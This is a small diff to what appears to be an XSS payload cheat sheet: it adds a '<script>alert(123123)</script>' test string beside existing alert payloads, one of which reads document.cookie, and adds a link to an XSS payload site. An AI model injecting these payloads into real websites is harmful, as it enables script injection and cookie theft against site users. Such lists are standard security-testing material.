@@ -3,6 +3,7 @@
 ```javascript
 <script>alert("XSS")</script>
 <script>alert('XSS')</script>
+<script>alert(123123)</script>
 <script>alert(document.cookie)</script>
 ```
 
@@ -50,3 +51,4 @@ Misc
 ----
 
 * [JSFuck](http://www.jsfuck.com/) - Javascript with six characters
+* [XSS Payloads](http://www.xss-payloads.com/) - a variety of XSS payloads
